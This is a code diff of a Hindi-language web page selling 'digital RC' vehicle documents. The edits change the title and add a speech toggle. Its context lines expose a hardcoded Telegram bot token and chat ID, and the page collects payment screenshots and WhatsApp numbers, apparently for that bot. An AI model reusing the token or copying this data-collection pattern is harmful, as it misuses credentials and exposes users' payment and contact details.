@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RCPDF.IN - Official Digital RC</title>
+    <title>RCPDF.IN - ♥️📇💳 Digital RC</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -79,7 +79,7 @@
         <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
         <b class="logo">RCPDF.IN</b>
         <div style="display:flex; align-items:center; gap:15px;">
-            <span style="font-size:22px; cursor:pointer;" onclick="speak('नमस्ते! कृपया अपने गाड़ी नंबर दर्ज कीजिए')">🔊</span>
+            <span id="spkIcon" style="font-size:22px; cursor:pointer;" onclick="toggleSpeech('नमस्ते! कृपया अपने गाड़ी नंबर दर्ज कीजिए')">🔊</span>
             <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
         </div>
     </div>
@@ -152,12 +152,15 @@
         const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
         const T_CHAT_ID = "5600045707";
 
-        function speak(t) {
-            window.speechSynthesis.cancel();
-            let u = new SpeechSynthesisUtterance(t);
-            u.lang = 'hi-IN';
-            u.rate = 0.8; // Speed slow kar di gayi hai
-            window.speechSynthesis.speak(u);
+        function toggleSpeech(t) {
+            if (window.speechSynthesis.speaking) {
+                window.speechSynthesis.cancel();
+            } else {
+                let u = new SpeechSynthesisUtterance(t);
+                u.lang = 'hi-IN';
+                u.rate = 0.8;
+                window.speechSynthesis.speak(u);
+            }
         }
 
         function toggleM() { document.getElementById('side').classList.toggle('active'); }
@@ -180,9 +183,9 @@
             document.getElementById('p1').style.display='none'; 
             document.getElementById('p2').style.display='block';
             
-            // 2nd Page speech with delay
+            // On/Off logic with delay for 2nd page
             setTimeout(() => {
-                speak("ऊपर पे विथ यू पी आई बटन से पेमेंट कीजिए या क्यू आर कोड स्कैन कर के पेमेंट का स्क्रीनशॉट जरूर ले जब पेमेंट करके वापस पेज पर आये तब ही, या फिर क्यू आर पर पेमेंट होने के बाद अपना व्हाट्सएप नंबर डालें और अपने पेमेंट का स्क्रीनशॉट जरूर लगाएं पेमेंट पुष्टि के लिए जरूरी है");
+                toggleSpeech("ऊपर पे विथ यू पी आई बटन से पेमेंट कीजिए या क्यू आर कोड स्कैन कर के पेमेंट का स्क्रीनशॉट जरूर ले जब पेमेंट करके वापस पेज पर आये तब ही, या फिर क्यू आर पर पेमेंट होने के बाद अपना व्हाट्सएप नंबर डालें और अपने पेमेंट का स्क्रीनशॉट जरूर लगाएं पेमेंट पुष्टि के लिए जरूरी है");
             }, 800);
         }
 
@@ -201,7 +204,7 @@
             const s = document.getElementById('ss').files[0];
             if(m.length < 10 || !s) { alert("Details sahi bhare!"); return; }
             document.getElementById('load').style.display='flex';
-            speak("कृपया प्रतीक्षा कीजिए");
+            toggleSpeech("कृपया प्रतीक्षा कीजिए");
             let p = 0; let isPaused = false;
             let iv = setInterval(async () => {
                 if (isPaused) return;
@@ -232,7 +235,7 @@
         function showSuccess() {
             document.getElementById('load').style.display='none';
             document.getElementById('successOverlay').style.display='flex';
-            speak("मुबारक हो आपको आपकी आर सी व्हाट्सएप पर भेज दी जाएगी। कांग्रेचुलेशन");
+            toggleSpeech("मुबारक हो आपको आपकी आर सी व्हाट्सएप पर भेज दी जाएगी। कांग्रेचुलेशन");
             setTimeout(() => { window.location.reload(); }, 5000);
         }
 
